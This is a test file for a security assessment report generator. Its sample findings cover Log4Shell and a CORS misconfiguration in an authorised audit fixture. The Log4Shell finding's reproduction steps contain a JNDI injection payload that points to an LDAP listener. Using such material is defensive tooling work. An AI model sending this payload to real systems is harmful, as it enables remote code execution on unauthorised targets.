import { describe, expect, it } from "vitest";
import type { AssessmentState } from "../../domain/security/assessment.js";
import type { AssetRecord } from "../../domain/security/asset.js";
import type {
  CapecId,
  CveId,
  CweId,
  MitreAttackTechniqueId,
} from "../../domain/security/classification.js";
import type { SecurityFinding } from "../../domain/security/finding.js";
import { defaultReportGenerator } from "./reportGenerator.js";

const sampleAsset: AssetRecord = {
  id: "ast_0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
  name: "auth-service",
  type: "source_repository",
  path: "/srv/auth-service",
  digest: null,
  architecture: "x86_64",
  version: null,
  environment: null,
  tags: ["backend", "critical"],
  metadata: { format: "directory" },
};

const sampleCriticalFinding: SecurityFinding = {
  id: "fnd_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
  name: "Log4j JNDI Remote Code Execution",
  affected_asset: {
    id: sampleAsset.id,
    name: sampleAsset.name,
    type: sampleAsset.type,
  },
  location: {
    file: "pom.xml",
    function: null,
    line: 42,
    column: 5,
    end_line: 45,
    module: "log4j-core",
    component: "dependency",
    address: null,
    offset: null,
  },
  technical_description:
    "Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features do not protect against attacker-controlled LDAP.",
  root_cause:
    "Improper neutralization of special elements in JNDI lookup expressions allowing uncontrolled object deserialization.",
  evidence_ids: [
    "ev_1111111111111111111111111111111111111111111111111111111111111111",
  ],
  reproduction_steps: [
    "Send HTTP GET with Header: X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Exploit}",
    "Observe outbound lookup to controlled LDAP listener",
  ],
  impact: {
    description: "Complete compromise of backend authentication daemon.",
    attack_prerequisites: ["Network accessibility to affected HTTP endpoint"],
    exploitability: "PROVEN",
  },
  severity: {
    level: "CRITICAL",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cvss_score: 9.8,
    justification: "Unauthenticated remote code execution over public network.",
  },
  confidence: {
    level: "CONFIRMED",
    false_positive_considerations: [],
    verification_method: "Dependency lockfile SHA256 and AST resolution",
  },
  remediation: {
    description: "Upgrade log4j-core to version 2.17.1 or newer.",
    code_diff: "- <version>2.14.1</version>\n+ <version>2.17.1</version>",
    config_example: "log4j2.formatMsgNoLookups=true",
    priority: "IMMEDIATE",
    validation_procedure: "Run 'mvn dependency:tree' and verify no log4j < 2.17.1 exists.",
  },
  classification: {
    cve: ["CVE-2021-44228" as CveId],
    cwe: ["CWE-502" as CweId],
    capec: ["CAPEC-586" as CapecId],
    mitre_attack: ["T1190" as MitreAttackTechniqueId],
    owasp: ["A03:2021-Injection"],
  },
  verification_status: "VERIFIED",
  provenance: {
    discovered_by: "trivy-scanner",
    discovered_at: "2026-11-05T12:05:00Z",
    verified_by: "rea-verification-agent",
    verified_at: "2026-11-05T12:10:00Z",
  },
};

const sampleMediumFinding: SecurityFinding = {
  id: "fnd_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
  name: "Permissive CORS Wildcard",
  affected_asset: {
    id: sampleAsset.id,
    name: sampleAsset.name,
    type: sampleAsset.type,
  },
  location: {
    file: "src/server.ts",
    function: "configureCors",
    line: 88,
    column: 10,
    end_line: 88,
    module: "server",
    component: null,
    address: null,
    offset: null,
  },
  technical_description: "Access-Control-Allow-Origin is configured to '*'.",
  root_cause: "Overly permissive wildcard in CORS middleware configuration.",
  evidence_ids: [],
  reproduction_steps: ["Inspect CORS headers on OPTIONS response"],
  impact: {
    description: "Cross-site data reading if credentials are leaked.",
    attack_prerequisites: [],
    exploitability: "THEORETICAL",
  },
  severity: {
    level: "MEDIUM",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
    cvss_score: 4.3,
    justification: "Low impact CORS read exposure.",
  },
  confidence: {
    level: "CONFIRMED",
    false_positive_considerations: [],
    verification_method: "Static AST matching",
  },
  remediation: {
    description: "Specify allowed origins explicitly.",
    code_diff: "- cors({ origin: '*' })\n+ cors({ origin: ['https://app.example.com'] })",
    config_example: null,
    priority: "MEDIUM_TERM",
    validation_procedure: "Check OPTIONS request with arbitrary origin.",
  },
  classification: {
    cve: [],
    cwe: ["CWE-942" as CweId],
    capec: [],
    mitre_attack: [],
    owasp: ["A01:2021-Broken Access Control"],
  },
  verification_status: "UNVERIFIED",
  provenance: {
    discovered_by: "semgrep-scanner",
    discovered_at: "2026-11-05T12:06:00Z",
    verified_by: null,
    verified_at: null,
  },
};

const sampleAssessment: AssessmentState = {
  assessment_id: "asm_0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
  objective: {
    title: "Auth Service Core Audit",
    target_technologies: ["Node.js", "Java", "Docker"],
    compliance_frameworks: ["SOC2", "OWASP Top 10"],
    focus_areas: ["Authentication", "Supply Chain"],
    depth: "exhaustive",
  },
  scope: {
    allowed_targets: ["/srv/auth-service"],
    denied_targets: ["/srv/auth-service/production.env"],
    authorized_by: "Security Operations Director",
    authorization_reference: "SEC-ENG-2026-088",
    valid_until: "2026-12-31T23:59:59Z",
    allow_active_verification: true,
  },
  phase: "completed",
  created_at: "2026-11-05T12:00:00Z",
  updated_at: "2026-11-05T12:30:00Z",
  completed_at: "2026-11-05T12:30:00Z",
  assets: [sampleAsset],
  findings: [sampleMediumFinding, sampleCriticalFinding], // deliberately unsorted
  metrics: {
    total_assets: 1,
    total_findings: 2,
    critical_findings: 1,
    high_findings: 0,
    medium_findings: 1,
    low_findings: 0,
    info_findings: 0,
    verified_findings: 1,
  },
};

describe("SecurityReportGenerator", () => {
  it("generates markdown report with sorted findings and dossiers", () => {
    const md = defaultReportGenerator.generate({
      assessment: sampleAssessment,
      format: "markdown",
    });

    expect(md).toContain("# Security Assessment Report: Auth Service Core Audit");
    expect(md).toContain("asm_0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef");
    expect(md).toContain("CRITICAL");
    expect(md).toContain("MEDIUM");
    expect(md).toContain("SEC-ENG-2026-088");
    // Ensure critical finding is sorted before medium
    const critPos = md.indexOf("Log4j JNDI Remote Code Execution");
    const medPos = md.indexOf("Permissive CORS Wildcard");
    expect(critPos).toBeLessThan(medPos);

    // Verify code diff inclusion
    expect(md).toContain("```diff");
    expect(md).toContain("+ <version>2.17.1</version>");
  });

  it("generates valid canonical JSON report", () => {
    const jsonStr = defaultReportGenerator.generate({
      assessment: sampleAssessment,
      format: "json",
    });

    const parsed = JSON.parse(jsonStr);
    expect(parsed.assessment_id).toBe(sampleAssessment.assessment_id);
    expect(parsed.findings).toHaveLength(2);
    expect(parsed.metrics.critical_findings).toBe(1);
  });

  it("generates valid SARIF v2.1.0 output with rules and results", () => {
    const sarifStr = defaultReportGenerator.generate({
      assessment: sampleAssessment,
      format: "sarif",
    });

    const parsed = JSON.parse(sarifStr);
    expect(parsed.version).toBe("2.1.0");
    expect(parsed.runs).toHaveLength(1);
    expect(parsed.runs[0].tool.driver.name).toBe("REA Security Platform");
    expect(parsed.runs[0].results).toHaveLength(2);

    // Critical finding should have level 'error'
    const critResult = parsed.runs[0].results.find(
      (r: any) => r.ruleId === "CVE-2021-44228",
    );
    expect(critResult).toBeDefined();
    expect(critResult.level).toBe("error");

    // Medium finding should have level 'warning'
    const medResult = parsed.runs[0].results.find(
      (r: any) => r.ruleId === "CWE-942",
    );
    expect(medResult).toBeDefined();
    expect(medResult.level).toBe("warning");
  });

  it("generates self-contained interactive HTML report", () => {
    const html = defaultReportGenerator.generate({
      assessment: sampleAssessment,
      format: "html",
    });

    expect(html).toContain("<!DOCTYPE html>");
    expect(html).toContain("<title>Security Assessment Report - Auth Service Core Audit</title>");
    expect(html).toContain("val-critical");
    expect(html).toContain("Log4j JNDI Remote Code Execution");
    expect(html).toContain("Permissive CORS Wildcard");
    expect(html).toContain("diff-add");
  });

  it("handles empty findings gracefully", () => {
    const emptyAssessment: AssessmentState = {
      ...sampleAssessment,
      findings: [],
      metrics: {
        total_assets: 1,
        total_findings: 0,
        critical_findings: 0,
        high_findings: 0,
        medium_findings: 0,
        low_findings: 0,
        info_findings: 0,
        verified_findings: 0,
      },
    };

    const md = defaultReportGenerator.generate({
      assessment: emptyAssessment,
      format: "markdown",
    });
    expect(md).toContain("No security vulnerabilities or weaknesses detected");

    const html = defaultReportGenerator.generate({
      assessment: emptyAssessment,
      format: "html",
    });
    expect(html).toContain("No security findings detected within the authorized engagement scope.");
  });
});
